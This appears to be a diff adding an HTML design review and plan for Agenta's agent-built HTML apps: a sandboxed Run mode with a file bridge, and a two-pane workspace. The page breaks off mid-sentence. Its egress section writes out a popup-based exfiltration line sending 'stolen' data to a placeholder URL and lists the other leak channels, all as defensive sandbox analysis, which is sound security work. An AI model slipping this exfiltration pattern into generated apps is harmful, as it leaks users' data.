@@ -1,0 +1,956 @@
+<!doctype html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<meta name="color-scheme" content="light dark">
+<title>Agent HTML Apps Plan</title>
+<style>img{max-width:100%}[hidden]{display:none!important}</style>
+<link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Bricolage+Grotesque:opsz,wght@12..96,500;12..96,700&family=IBM+Plex+Sans:wght@400;500;600&family=IBM+Plex+Mono:wght@400;500&display=swap">
+<style>
+:root{
+  --ground:#F4F5F7; --surface:#FFFFFF; --sunken:#ECEEF2; --ink:#16181D; --muted:#5B6270; --line:#D9DCE3; --line-strong:#B8BEC9;
+  --accent:#0F766E; --accent-soft:#D9F0EC; --accent-ink:#0B5A54;
+  --warn:#B45309; --warn-soft:#FBEBD5; --crit:#B91C1C; --crit-soft:#F8DEDE; --ok:#15803D; --ok-soft:#DCF1E3;
+  --code-bg:#EEF0F4; --shadow:0 1px 2px rgba(22,24,29,.06),0 8px 24px -12px rgba(22,24,29,.12);
+}
+@media (prefers-color-scheme: dark){:root:not([data-theme="light"]){
+  --ground:#121417; --surface:#1A1D22; --sunken:#15181D; --ink:#E8EAEE; --muted:#9AA2B1; --line:#2A2F38; --line-strong:#3C4350;
+  --accent:#34C4B0; --accent-soft:#12312D; --accent-ink:#7EE0D2;
+  --warn:#F0A34A; --warn-soft:#3A2A14; --crit:#F07070; --crit-soft:#3C1C1C; --ok:#5FCF83; --ok-soft:#173523;
+  --code-bg:#22262D; --shadow:0 1px 2px rgba(0,0,0,.4),0 8px 24px -12px rgba(0,0,0,.6);
+}}
+:root[data-theme="dark"]{
+  --ground:#121417; --surface:#1A1D22; --sunken:#15181D; --ink:#E8EAEE; --muted:#9AA2B1; --line:#2A2F38; --line-strong:#3C4350;
+  --accent:#34C4B0; --accent-soft:#12312D; --accent-ink:#7EE0D2;
+  --warn:#F0A34A; --warn-soft:#3A2A14; --crit:#F07070; --crit-soft:#3C1C1C; --ok:#5FCF83; --ok-soft:#173523;
+  --code-bg:#22262D; --shadow:0 1px 2px rgba(0,0,0,.4),0 8px 24px -12px rgba(0,0,0,.6);
+}
+*{box-sizing:border-box}
+body{margin:0;background:var(--ground);color:var(--ink);font-family:"IBM Plex Sans",system-ui,-apple-system,"Segoe UI",sans-serif;font-size:15px;line-height:1.55;padding-inline:20px;padding-block:0 96px;-webkit-font-smoothing:antialiased}
+a{color:var(--accent-ink);text-decoration:none;border-bottom:1px solid var(--line-strong)}
+a:hover{border-bottom-color:var(--accent)}
+a:focus-visible,button:focus-visible{outline:2px solid var(--accent);outline-offset:2px}
+code,pre,.mono{font-family:"IBM Plex Mono",ui-monospace,SFMono-Regular,Menlo,monospace}
+code{font-size:.88em;background:var(--code-bg);padding:.1em .35em;border-radius:4px}
+pre{background:var(--code-bg);padding:14px 16px;border-radius:6px;overflow-x:auto;font-size:13px;line-height:1.5;margin:0}
+pre code{background:none;padding:0;font-size:inherit}
+h1,h2,h3{font-family:"Bricolage Grotesque","IBM Plex Sans",system-ui,sans-serif;text-wrap:balance;line-height:1.15;margin:0}
+h1{font-size:clamp(30px,4.2vw,44px);font-weight:700;letter-spacing:-.01em}
+h2{font-size:26px;font-weight:700;letter-spacing:-.005em;margin-top:64px;padding-top:24px;border-top:1px solid var(--line)}
+h3{font-size:18px;font-weight:600;margin-top:32px}
+p{margin:12px 0;max-width:72ch}
+ul,ol{max-width:72ch;padding-left:22px;margin:10px 0}
+li{margin:5px 0}
+li::marker{color:var(--muted)}
+.wrap{max-width:1080px;margin:0 auto}
+.layout{display:grid;grid-template-columns:200px minmax(0,1fr);gap:48px;align-items:start}
+@media (max-width:860px){.layout{grid-template-columns:minmax(0,1fr)}.toc{display:none}}
+.toc{position:sticky;top:24px;font-size:13px;padding-top:88px}
+.toc a{display:block;border:0;color:var(--muted);padding:4px 0}
+.toc a:hover{color:var(--ink)}
+.toc .lbl{font-size:11px;letter-spacing:.08em;text-transform:uppercase;color:var(--muted);margin-bottom:8px}
+header.hero{padding-block:56px 12px}
+.eyebrow{font-size:12px;letter-spacing:.09em;text-transform:uppercase;color:var(--muted);font-weight:500;margin-bottom:14px}
+.lede{font-size:18px;color:var(--muted);max-width:64ch;margin-top:14px}
+.meta{display:flex;flex-wrap:wrap;gap:8px 20px;margin-top:22px;font-size:13px;color:var(--muted)}
+.meta b{color:var(--ink);font-weight:500}
+.verdicts{display:grid;grid-template-columns:repeat(auto-fit,minmax(300px,1fr));gap:16px;margin-top:28px}
+.verdict{background:var(--surface);border:1px solid var(--line);border-radius:8px;padding:18px 20px;box-shadow:var(--shadow)}
+.verdict .pr{font-size:12px;letter-spacing:.06em;text-transform:uppercase;color:var(--muted)}
+.verdict h3{margin:6px 0 8px;font-size:17px}
+.verdict p{font-size:14px;margin:6px 0}
+.pill{display:inline-block;font-size:12px;font-weight:500;padding:2px 9px;border-radius:999px;border:1px solid transparent;vertical-align:middle;white-space:nowrap}
+.pill.ok{background:var(--ok-soft);color:var(--ok)}
+.pill.warn{background:var(--warn-soft);color:var(--warn)}
+.pill.crit{background:var(--crit-soft);color:var(--crit)}
+.pill.acc{background:var(--accent-soft);color:var(--accent-ink)}
+.pill.mute{background:var(--sunken);color:var(--muted);border-color:var(--line)}
+figure{margin:28px 0;background:var(--surface);border:1px solid var(--line);border-radius:8px;padding:18px 18px 12px}
+figure svg{display:block;max-width:100%;height:auto;color:var(--ink);font-family:"IBM Plex Sans",system-ui,sans-serif}
+figcaption{font-size:13px;color:var(--muted);margin-top:10px;max-width:80ch}
+.tbl{overflow-x:auto;margin:18px 0}
+table{border-collapse:collapse;width:100%;font-size:14px;background:var(--surface);border:1px solid var(--line);border-radius:8px;overflow:hidden}
+th,td{text-align:left;padding:10px 12px;border-bottom:1px solid var(--line);vertical-align:top}
+th{font-size:12px;letter-spacing:.06em;text-transform:uppercase;color:var(--muted);font-weight:500;background:var(--sunken)}
+tr:last-child td{border-bottom:0}
+td.num{font-variant-numeric:tabular-nums;white-space:nowrap}
+.finding{display:grid;grid-template-columns:28px minmax(0,1fr);gap:12px;padding:14px 0;border-bottom:1px solid var(--line);max-width:80ch}
+.finding:last-child{border-bottom:0}
+.finding .sev{width:22px;height:22px;border-radius:50%;display:grid;place-items:center;font-size:11px;font-weight:600;margin-top:2px}
+.sev.c{background:var(--crit-soft);color:var(--crit)}.sev.w{background:var(--warn-soft);color:var(--warn)}.sev.i{background:var(--accent-soft);color:var(--accent-ink)}
+.finding b{font-weight:600}
+.finding p{margin:4px 0 0;font-size:14px;color:var(--muted)}
+.finding p strong{color:var(--ink);font-weight:500}
+.phases{display:grid;grid-template-columns:repeat(auto-fit,minmax(230px,1fr));gap:14px;margin-top:22px}
+.phase{background:var(--surface);border:1px solid var(--line);border-radius:8px;padding:16px 18px;border-top:3px solid var(--line-strong)}
+.phase.now{border-top-color:var(--accent)}
+.phase .k{font-size:12px;letter-spacing:.08em;text-transform:uppercase;color:var(--muted);font-weight:500}
+.phase h3{margin:4px 0 8px;font-size:17px}
+.phase ul{padding-left:18px;font-size:14px;margin:8px 0}
+.phase .est{font-size:13px;color:var(--muted);margin-top:10px;font-variant-numeric:tabular-nums}
+.callout{border-left:3px solid var(--accent);background:var(--accent-soft);padding:12px 16px;border-radius:0 6px 6px 0;margin:18px 0;max-width:80ch;font-size:14px}
+.callout.warn{border-left-color:var(--warn);background:var(--warn-soft)}
+.callout p{margin:4px 0}
+.dec{display:grid;grid-template-columns:minmax(0,1fr);gap:0;background:var(--surface);border:1px solid var(--line);border-radius:8px;margin-top:16px}
+.dec .row{display:grid;grid-template-columns:minmax(180px,.9fr) minmax(0,1.6fr);gap:16px;padding:12px 16px;border-bottom:1px solid var(--line);font-size:14px}
+.dec .row:last-child{border-bottom:0}
+.dec .row .q{font-weight:500}
+.dec .row .a{color:var(--muted)}
+.dec .row .a b{color:var(--ink);font-weight:600}
+@media (max-width:560px){.dec .row{grid-template-columns:minmax(0,1fr)}}
+.small{font-size:13px;color:var(--muted)}
+@media (prefers-reduced-motion:no-preference){a{transition:border-color .15s}}
+</style>
+</head>
+<body>
+
+<div class="wrap">
+<div class="layout">
+<nav class="toc" aria-label="Sections">
+  <div class="lbl">Contents</div>
+  <a href="#what">What an App is</a>
+  <a href="#verdict">Verdict</a>
+  <a href="#today">Where we are</a>
+  <a href="#run">Review: Run mode</a>
+  <a href="#workspace">Review: Workspace</a>
+  <a href="#arch">Architecture</a>
+  <a href="#plan">The plan</a>
+  <a href="#packages">Work packages</a>
+  <a href="#decisions">Decisions needed</a>
+  <a href="#risks">Risks</a>
+</nav>
+
+<main>
+<header class="hero">
+  <div class="eyebrow">Agenta · agent playground · review and plan</div>
+  <h1>HTML apps that agents build, run beside the conversation</h1>
+  <p class="lede">A review of Mahmoud's two design PRs and one sequenced plan that turns them into shippable work: an executable Run mode for agent-written HTML first, then a two-pane workspace to host it. In a hurry: the <a href="index.html">one-page summary</a> covers all seven documents.</p>
+  <div class="meta">
+    <span><b>PR #6529</b> Internal HTML apps · draft, docs only, 204 lines</span>
+    <span><b>PR #6775</b> Playground workspace PRD + RFC + mockup · 4,812 lines</span>
+    <span><b>Author</b> mmabrouk</span>
+    <span><b>Reviewed</b> 17 Sep 2026 against <code>main</code> at e83525a</span>
+  </div>
+</header>
+
+<section id="what">
+  <h2 style="margin-top:36px">What an App is</h2>
+  <p>An <b>App</b> is an ordinary HTML file that the agent wrote into the session's drive, opened in a mode where its own JavaScript is allowed to run. Nothing is uploaded or deployed. The file sits next to the agent's other files, and the "app" is what the user sees when Agenta executes it inside the playground instead of showing it as a static preview.</p>
+  <p>Today an HTML file in the drive has two views. <b>Preview</b> renders it with every script stripped, so it is safe but inert. <b>Source</b> shows the code. PR #6529 adds a third, <b>Run</b>, which executes the file in the same sandboxed iframe and hands it one small API, <code>window.agenta.fs</code>, that can read and write files in the app's own folder. The user chooses Run explicitly and picks what the app may touch.</p>
+  <p>The running example in both PRs is a todo board. The agent writes two files, <code>todo.html</code> and <code>board.json</code>. The user opens the HTML as an App beside the conversation, drags a card, and the App saves the new column layout to <code>board.json</code>. On the next turn the agent reads that file and sees what the user did. The App is the user's way to edit state that the agent also works with, without typing it into the chat.</p>
+
+  <figure>
+    <svg viewBox="0 0 960 200" role="img" aria-label="The loop: the agent writes todo.html and board.json into the drive; the user opens todo.html as an App in the playground; the App reads and writes board.json through the bridge; the agent reads board.json on the next turn.">
+      <defs>
+        <marker id="arw0" viewBox="0 0 10 10" refX="9" refY="5" markerWidth="8" markerHeight="8" orient="auto-start-reverse"><path d="M0,0 L10,5 L0,10 z" fill="currentColor"/></marker>
+      </defs>
+      <g font-size="12" fill="currentColor">
+        <rect x="20" y="60" width="150" height="70" rx="6" fill="none" stroke="currentColor"/>
+        <text x="95" y="90" text-anchor="middle" font-weight="600">Agent</text>
+        <text x="95" y="108" text-anchor="middle" opacity=".7">in the session</text>
+
+        <rect x="300" y="30" width="200" height="130" rx="6" fill="none" stroke="currentColor" stroke-dasharray="5 4"/>
+        <text x="400" y="52" text-anchor="middle" font-weight="600">Session drive</text>
+        <rect x="316" y="66" width="168" height="30" rx="4" fill="currentColor" opacity=".08"/>
+        <text x="400" y="86" text-anchor="middle" font-family="IBM Plex Mono, monospace" font-size="11">todo.html</text>
+        <rect x="316" y="106" width="168" height="30" rx="4" fill="var(--accent)" opacity=".18"/>
+        <text x="400" y="126" text-anchor="middle" font-family="IBM Plex Mono, monospace" font-size="11">board.json</text>
+
+        <rect x="640" y="30" width="300" height="130" rx="6" fill="none" stroke="var(--accent)" stroke-width="1.5"/>
+        <text x="790" y="52" text-anchor="middle" font-weight="600">App · todo.html running in the playground</text>
+        <rect x="660" y="68" width="80" height="60" rx="4" fill="none" stroke="currentColor" opacity=".6"/>
+        <rect x="700" y="68" width="80" height="60" rx="4" fill="none" stroke="currentColor" opacity=".6"/>
+        <rect x="740" y="68" width="80" height="60" rx="4" fill="none" stroke="currentColor" opacity=".6"/>
+        <rect x="666" y="76" width="68" height="14" rx="2" fill="currentColor" opacity=".18"/>
+        <rect x="746" y="76" width="68" height="14" rx="2" fill="var(--accent)" opacity=".4"/>
+        <text x="740" y="150" text-anchor="middle" opacity=".7">user drags a card</text>
+        <text x="880" y="98" text-anchor="middle" font-size="11" opacity=".7">User</text>
+      </g>
+      <path d="M170 82 C 230 82, 240 81, 300 81" fill="none" stroke="currentColor" marker-end="url(#arw0)"/>
+      <text x="235" y="72" font-size="11" text-anchor="middle" fill="currentColor">1  writes both files</text>
+      <path d="M500 81 C 560 81, 580 81, 640 81" fill="none" stroke="currentColor" marker-end="url(#arw0)"/>
+      <text x="570" y="71" font-size="11" text-anchor="middle" fill="currentColor">2  user opens as App</text>
+      <path d="M640 121 C 590 121, 560 121, 500 121" fill="none" stroke="var(--accent)" stroke-width="1.5" marker-end="url(#arw0)"/>
+      <text x="570" y="137" font-size="11" text-anchor="middle" fill="var(--accent)">3  agenta.fs.writeJSON</text>
+      <path d="M300 121 C 240 121, 200 121, 170 108" fill="none" stroke="currentColor" marker-end="url(#arw0)"/>
+      <text x="235" y="140" font-size="11" text-anchor="middle" fill="currentColor">4  reads next turn</text>
+    </svg>
+    <figcaption>The whole feature is this loop. Files are the shared state between the agent and the user; the App is a UI the agent made for editing them. For the same loop played out turn by turn with screen mockups and every file operation, see the <a href="walkthrough.html">Launch Board Walkthrough</a>. For five more app shapes pushed through the same bridge, and the gaps they expose, see <a href="six-apps.html">Six Apps, One Bridge</a>. For how an app comes to exist, and how two sessions end up with the same one, see <a href="creation.html">Agent App Creation</a>; for what lives with the agent rather than a session, see <a href="layout.html">Agent App Layout</a>; for apps that draw their own pixels, see <a href="canvas.html">Canvas Apps</a>.</figcaption>
+  </figure>
+
+  <p>Three terms the rest of this page relies on:</p>
+  <ul>
+    <li><b>Run mode</b> is the file viewer's third segment. It is a property of how an HTML file is opened, not a different kind of file. It lives in the file viewer, so it works anywhere a drive file can be shown.</li>
+    <li><b>The bridge</b> is <code>window.agenta.fs</code>: a handful of file methods the page injects before the app's own code, backed by messages to the parent window. The App never holds a token or talks to the API directly.</li>
+    <li><b>An App tab</b> is what PR #6775 adds: a tab in the second pane that holds an HTML file open in Run mode, so the user can use it while the conversation stays visible. Until that exists, Run mode works inside today's Files pane.</li>
+  </ul>
+</section>
+
+<section id="verdict">
+  <div class="verdicts">
+    <div class="verdict">
+      <div class="pr">PR #6529 · Run mode + file bridge</div>
+      <h3>Merge the doc after four amendments <span class="pill ok">Build this first</span></h3>
+      <p>The analysis of <code>HtmlBody</code> is accurate and the integration point is the smallest one available. The backend already has read, list, write and delete on mounts behind <code>VIEW_MOUNTS</code> / <code>EDIT_MOUNTS</code>, so the bridge is a frontend-only slice.</p>
+      <p>Amend: say which boundary the server holds. It bounds the mount (permission, project, no <code>..</code>) <em>and</em>, since the egress findings, the granted folder too — a prefix-scoped token checked on every file call. Ship read and write together. Use a <code>MessageChannel</code> port, not <code>window.postMessage("*")</code>. Name it <code>window.agenta</code>.</p>
+    </div>
+    <div class="verdict">
+      <div class="pr">PR #6775 · Workspace PRD + RFC</div>
+      <h3>Merge PRD + RFC, drop the mockup source <span class="pill warn">Re-scope</span></h3>
+      <p>The layer model (workspace / tab view / resource / runtime) is right and matches how the code already separates the chat registry from React. The RFC names the mobile host only as an open question, yet <code>/m</code> already had <code>SessionWorkspace</code> on the same <code>SplitPane</code> and pane atoms a month before the RFC's pinned commit, and it is the target app.</p>
+      <p>Re-scope v1 so the second pane holds only non-session tabs. That ships the HTML-app loop without breaking the single-active-session assumption that shortcuts, hydration, URL sync and the files pane all depend on.</p>
+    </div>
+  </div>
+  <div class="callout">
+    <p><strong>The one-line plan.</strong> Run mode lands in <code>@agenta/entity-ui</code> so both hosts get it for free. The workspace lands as a package hosted by desktop <code>AgentChatPanel</code> and mobile <code>SessionWorkspace</code>. The two are independent until the "app tab" joins them in phase 2.</p>
+  </div>
+</section>
+
+<section id="today">
+  <h2>Where we are</h2>
+  <p>Today the desktop playground is three fixed columns. The middle column owns session tabs and the transcript. The Files pane on the right follows whichever session is active, and every consumer of "the session" reads one atom per chat scope.</p>
+
+  <figure>
+    <svg viewBox="0 0 960 250" role="img" aria-label="Today: config pane, chat column with session tabs, and a files pane that follows the active session. Proposed: config pane plus two panes that each hold movable tabs of any kind.">
+      <defs>
+        <marker id="arw" viewBox="0 0 10 10" refX="9" refY="5" markerWidth="8" markerHeight="8" orient="auto-start-reverse"><path d="M0,0 L10,5 L0,10 z" fill="currentColor"/></marker>
+      </defs>
+      <!-- TODAY -->
+      <text x="20" y="22" font-size="12" font-weight="600" letter-spacing=".08em" fill="currentColor" opacity=".6">TODAY · AgentChatPanel</text>
+      <rect x="20" y="34" width="80" height="190" rx="4" fill="none" stroke="currentColor" opacity=".6"/>
+      <text x="60" y="130" font-size="12" text-anchor="middle" fill="currentColor">Config</text>
+      <rect x="110" y="34" width="210" height="190" rx="4" fill="none" stroke="currentColor"/>
+      <rect x="118" y="42" width="52" height="18" rx="3" fill="currentColor" opacity=".18"/>
+      <rect x="174" y="42" width="52" height="18" rx="3" fill="none" stroke="currentColor" opacity=".5"/>
+      <rect x="230" y="42" width="52" height="18" rx="3" fill="none" stroke="currentColor" opacity=".5"/>
+      <text x="215" y="140" font-size="12" text-anchor="middle" fill="currentColor">session A transcript</text>
+      <text x="215" y="158" font-size="11" text-anchor="middle" fill="currentColor" opacity=".6">activeSessionId(scope)</text>
+      <rect x="330" y="34" width="110" height="190" rx="4" fill="none" stroke="currentColor" stroke-dasharray="4 3"/>
+      <text x="385" y="124" font-size="12" text-anchor="middle" fill="currentColor">Files pane</text>
+      <text x="385" y="142" font-size="11" text-anchor="middle" fill="currentColor" opacity=".6">follows active</text>
+      <line x1="320" y1="110" x2="330" y2="110" stroke="currentColor" marker-end="url(#arw)"/>
+      <!-- PROPOSED -->
+      <text x="520" y="22" font-size="12" font-weight="600" letter-spacing=".08em" fill="currentColor" opacity=".6">PROPOSED · workspace with two panes</text>
+      <rect x="520" y="34" width="80" height="190" rx="4" fill="none" stroke="currentColor" opacity=".6"/>
+      <text x="560" y="130" font-size="12" text-anchor="middle" fill="currentColor">Config</text>
+      <rect x="610" y="34" width="160" height="190" rx="4" fill="none" stroke="currentColor"/>
+      <rect x="618" y="42" width="52" height="18" rx="3" fill="currentColor" opacity=".18"/>
+      <rect x="674" y="42" width="52" height="18" rx="3" fill="none" stroke="currentColor" opacity=".5"/>
+      <text x="690" y="135" font-size="12" text-anchor="middle" fill="currentColor">Pane A</text>
+      <text x="690" y="153" font-size="11" text-anchor="middle" fill="currentColor" opacity=".6">session · session</text>
+      <rect x="780" y="34" width="160" height="190" rx="4" fill="none" stroke="var(--accent)" stroke-width="1.5"/>
+      <rect x="788" y="42" width="44" height="18" rx="3" fill="var(--accent)" opacity=".25"/>
+      <rect x="836" y="42" width="44" height="18" rx="3" fill="none" stroke="var(--accent)" opacity=".7"/>
+      <rect x="884" y="42" width="44" height="18" rx="3" fill="none" stroke="var(--accent)" opacity=".7"/>
+      <text x="860" y="135" font-size="12" text-anchor="middle" fill="currentColor">Pane B</text>
+      <text x="860" y="153" font-size="11" text-anchor="middle" fill="currentColor" opacity=".6">file · explorer · app</text>
+      <path d="M735 51 C 760 20, 800 20, 826 44" fill="none" stroke="var(--accent)" stroke-width="1.5" marker-end="url(#arw)"/>
+      <text x="780" y="18" font-size="11" text-anchor="middle" fill="var(--accent)">move tab</text>
+      <rect x="610" y="232" width="330" height="1" fill="currentColor" opacity=".3"/>
+      <text x="775" y="246" font-size="11" text-anchor="middle" fill="currentColor" opacity=".6">one SplitPane, shared pane atoms in @agenta/chat/state</text>
+    </svg>
+    <figcaption>The proposal replaces the fixed Files pane with a second tab host. Everything the Files pane does today becomes an explorer tab bound to one drive instead of following the active session.</figcaption>
+  </figure>
+
+  <h3>Facts the plan rests on</h3>
+  <ul>
+    <li><b>HTML preview is already sandboxed.</b> <code>renderers.tsx</code> inlines mount assets, strips every script vector, injects one nav interceptor, and renders through <code>srcdoc</code> with <code>allow-scripts allow-popups allow-popups-to-escape-sandbox</code> and no <code>allow-same-origin</code>.</li>
+    <li><b>The mounts API is complete for v1.</b> <code>GET /mounts/{id}/files?read=</code> returns text, <code>?path=</code> lists, <code>PUT …/files?path=</code> writes a raw body, <code>DELETE …/files?path=</code> removes. The Fern client exposes all four. Reads gate on <code>VIEW_MOUNTS</code>, writes on <code>EDIT_MOUNTS</code>.</li>
+    <li><b>Both hosts already share the pane state.</b> <code>chatPanelMaximizedAtom</code>, <code>configPanelCollapsedAtom</code>, <code>filesPaneWidthAtom</code> live in <code>@agenta/chat/state</code>. Desktop's <code>AgentChatPanel</code> and mobile's <code>SessionWorkspace</code> both drive the kit <code>SplitPane</code> with them.</li>
+    <li><b>Chat runtimes already outlive React.</b> <code>sessionChats.ts</code> keeps <code>Chat</code> instances in a module map keyed by session id; the desktop holds one while the tab is open. Callbacks rebind to the latest committing view.</li>
+    <li><b>Closing a running tab is a Stop.</b> <code>shouldCancelRunOnClose</code> sends the cooperative cancel. The PRD proposes reversing this.</li>
+    <li><b>dnd-kit is a desktop dependency only.</b> It is in <code>web/oss/package.json</code>, not in any package or in mobile.</li>
+  </ul>
+</section>
+
+<section id="run">
+  <h2>Review: PR #6529, Run mode and the file bridge</h2>
+  <p>The design is sound where it matters: explicit execution, opaque origin, no credential in the frame, narrow methods. The findings below are what I would change before treating the contract as a product API.</p>
+
+  <figure>
+    <svg viewBox="0 0 960 330" role="img" aria-label="Request flow: app code in the sandboxed iframe calls window.agenta.fs, which posts over a MessageChannel port to the bridge host in the parent. The host validates port, grant, path and permission, then calls the Fern mounts client, which hits the mounts API and the drive. No token crosses into the iframe.">
+      <defs>
+        <marker id="arw2" viewBox="0 0 10 10" refX="9" refY="5" markerWidth="8" markerHeight="8" orient="auto-start-reverse"><path d="M0,0 L10,5 L0,10 z" fill="currentColor"/></marker>
+      </defs>
+      <!-- iframe box -->
+      <rect x="20" y="40" width="230" height="200" rx="6" fill="none" stroke="currentColor" stroke-dasharray="5 4"/>
+      <text x="32" y="30" font-size="12" font-weight="600" letter-spacing=".06em" fill="currentColor" opacity=".6">SANDBOXED IFRAME · opaque origin</text>
+      <rect x="36" y="56" width="198" height="60" rx="4" fill="currentColor" opacity=".08"/>
+      <text x="135" y="80" font-size="12" text-anchor="middle" fill="currentColor">todo.html</text>
+      <text x="135" y="100" font-size="11" text-anchor="middle" fill="currentColor" opacity=".7" font-family="IBM Plex Mono, monospace">agenta.fs.writeJSON("board.json")</text>
+      <rect x="36" y="140" width="198" height="60" rx="4" fill="var(--accent)" opacity=".18"/>
+      <text x="135" y="164" font-size="12" text-anchor="middle" fill="currentColor">bridge stub (injected first)</text>
+      <text x="135" y="184" font-size="11" text-anchor="middle" fill="currentColor" opacity=".7">promise ↔ request id · no token</text>
+      <line x1="135" y1="116" x2="135" y2="140" stroke="currentColor" marker-end="url(#arw2)"/>
+      <text x="135" y="228" font-size="11" text-anchor="middle" fill="currentColor" opacity=".6">srcdoc + CSP meta: no external scripts</text>
+      <!-- boundary -->
+      <line x1="280" y1="20" x2="280" y2="300" stroke="var(--crit)" stroke-width="1.5" stroke-dasharray="6 4"/>
+      <text x="280" y="318" font-size="11" text-anchor="middle" fill="var(--crit)">no cookie, token, or axios crosses this line</text>
+      <!-- port arrow -->
+      <line x1="234" y1="170" x2="330" y2="170" stroke="currentColor" marker-end="url(#arw2)"/>
+      <text x="282" y="160" font-size="11" text-anchor="middle" fill="currentColor">MessageChannel port</text>
+      <!-- host box -->
+      <rect x="330" y="60" width="230" height="220" rx="6" fill="none" stroke="currentColor"/>
+      <text x="342" y="50" font-size="12" font-weight="600" letter-spacing=".06em" fill="currentColor" opacity=".6">BRIDGE HOST · parent (HtmlBody)</text>
+      <g font-size="12" fill="currentColor">
+        <text x="350" y="92">1  port is this iframe's</text>
+        <text x="350" y="118">2  grant covers method (read / write)</text>
+        <text x="350" y="144">3  path normalizes inside app folder</text>
+        <text x="350" y="170">4  user has VIEW / EDIT_MOUNTS</text>
+        <text x="350" y="196">5  size cap · UTF-8 only</text>
+      </g>
+      <line x1="350" y1="212" x2="540" y2="212" stroke="currentColor" opacity=".3"/>
+      <text x="445" y="236" font-size="11" text-anchor="middle" fill="currentColor" opacity=".7">reject → {code: "scope" | "read_only" | "not_found"}</text>
+      <text x="445" y="256" font-size="11" text-anchor="middle" fill="currentColor" opacity=".7">write ok → bump drive generation</text>
+      <!-- to fern -->
+      <line x1="560" y1="150" x2="640" y2="150" stroke="currentColor" marker-end="url(#arw2)"/>
+      <rect x="640" y="120" width="130" height="60" rx="4" fill="none" stroke="currentColor"/>
+      <text x="705" y="146" font-size="12" text-anchor="middle" fill="currentColor">Fern mounts client</text>
+      <text x="705" y="164" font-size="11" text-anchor="middle" fill="currentColor" opacity=".7">user's real credentials</text>
+      <line x1="770" y1="150" x2="830" y2="150" stroke="currentColor" marker-end="url(#arw2)"/>
+      <rect x="830" y="100" width="110" height="100" rx="4" fill="none" stroke="currentColor"/>
+      <text x="885" y="130" font-size="12" text-anchor="middle" fill="currentColor">/mounts/{id}</text>
+      <text x="885" y="148" font-size="12" text-anchor="middle" fill="currentColor">/files</text>
+      <text x="885" y="172" font-size="11" text-anchor="middle" fill="currentColor" opacity=".7">read · list · write · delete</text>
+      <text x="885" y="188" font-size="11" text-anchor="middle" fill="var(--warn)">mount-level perms only</text>
+    </svg>
+    <figcaption>Every file operation is a round trip through the parent. The parent enforces the folder scope; the server enforces only the mount permission. That gap is the amendment that matters most.</figcaption>
+  </figure>
+
+  <h3>Findings</h3>
+  <div class="finding"><span class="sev w">1</span><div><b>The server bounds the mount, not the folder. Say which boundary is which. <em>(Superseded — the folder is a server boundary now.)</em></b><p><em>Kept as the record of what this review concluded and why it was wrong. The reasoning below rests on "the app has no way to get data out", which was disproved three times: popups, WebRTC, and a <code>data:</code> iframe in Preview. The folder rule now lives on the server as a prefix-scoped token (<code>core/apps/scope_token.py</code>) checked on every file call — so "today the answer is none" and "a later phase" no longer hold.</em></p><p>On every file call the server checks <code>VIEW_MOUNTS</code> / <code>EDIT_MOUNTS</code>, resolves the mount inside the project, and <code>validate_file_path</code> rejects absolute paths and any <code>..</code> segment, so no request can escape the mount. It has no notion of a per-folder grant: the bridge's request is byte-identical to the user editing that file in the Files pane. Question 7 in the doc asks what server check guarantees folder scope; today the answer is none. That is acceptable for v1 because the app is agent-authored inside a drive the agent already owns, and the assets that matter (cookies, tokens, other projects) are isolated by the sandbox and the mount permission. <strong>The doc's "server remains the final authorization boundary" is true of the mount and should say so; folder scope is a client-side guardrail.</strong> A server-side scoped token is a later phase if apps ever become shareable.</p></div></div>
+  <div class="finding"><span class="sev w">2</span><div><b>Ship read and write together, behind one grant prompt.</b><p>A read-only slice proves the protocol but not the product loop, which is "the app updates board.json and the agent sees it". The write endpoint exists, is gated on <code>EDIT_MOUNTS</code>, and the parent already has the mount context. Read-only becomes the fallback grant level, not a separate release.</p></div></div>
+  <div class="finding"><span class="sev i">3</span><div><b>Use a MessageChannel port instead of <code>parent.postMessage(…, "*")</code>.</b><p>The parent creates the channel, posts <code>port2</code> into the iframe with the hello message, and thereafter talks only over that port. This removes the <code>event.source</code> check from every request, makes spoofing from a nested frame impossible, and gives you a clean "invalidate on remount" story: close the port, the old iframe is dead. The existing nav interceptor can move to the same port.</p></div></div>
+  <div class="finding"><span class="sev i">4</span><div><b>Name it <code>window.agenta</code>, version the contract, freeze error codes.</b><p>Generated HTML will hard-code the global; "arg" reads as a typo. Keep <code>version: 1</code>, and publish the error code set (<code>scope</code>, <code>read_only</code>, <code>not_found</code>, <code>conflict</code>, <code>too_large</code>, <code>unavailable</code>) as part of the contract, since apps will branch on them.</p></div></div>
+  <div class="finding"><span class="sev i">5</span><div><b>Tighten the Run sandbox and add a CSP.</b><p>Run needs neither popup flag: keep <code>allow-scripts allow-forms</code> and nothing else. Dropping <code>allow-popups</code> is what closes the app’s egress, not the CSP — see <a href="#egress">the egress surface</a> below. Inject <code>&lt;meta http-equiv="Content-Security-Policy" content="default-src 'none'; script-src 'unsafe-inline'; style-src 'unsafe-inline'; img-src data: blob:; font-src data:; form-action 'none'"&gt;</code> at the head of the assembled document so an app cannot pull external scripts. That answers question 5: external scripts no, inline yes, mount assets inlined as today.</p></div></div>
+  <div class="finding" id="egress"><span class="sev i">5b</span><div><b>What actually stops an app reaching the network.</b><p>“The app cannot fetch anything” is the sentence the whole security model rests on, and <code>default-src 'none'</code> is not what delivers it. CSP’s fetch directives do not govern <em>navigation</em>, and <code>navigate-to</code> never shipped in any browser — so no CSP value blocks a popup. Only the sandbox attribute does.</p><p>With <code>allow-popups</code> set, an app could call <code>window.open("https://…?d=" + stolen)</code> synchronously inside any click it already handled, then <code>close()</code> the window. Verified against the real assembled document: with the flag, the listening server logged the request and the data; without it, nothing arrived. The exploit has to read its data <em>before</em> the click — an <code>await</code> first loses transient user activation and the popup blocker eats the open — which is not a hurdle.</p><table><thead><tr><th>Channel</th><th>Stopped by</th></tr></thead><tbody><tr><td><code>fetch</code>, XHR, WebSocket</td><td><code>default-src 'none'</code></td></tr><tr><td>Image beacon</td><td><code>img-src data: blob:</code></td></tr><tr><td><code>window.open</code> to any URL</td><td><b>no <code>allow-popups</code></b></td></tr><tr><td><code>&lt;form action="https://…"&gt;</code></td><td><b><code>form-action 'none'</code></b>, which does not inherit from <code>default-src</code></td></tr><tr><td>Parent page, cookies</td><td>no <code>allow-same-origin</code></td></tr></tbody></table><p>Two consequences for later phases. An app that wants an external link does not get a popup: the click reaches the host as a <code>nav</code> message and the host decides, so the person sees the destination. And any future CSP 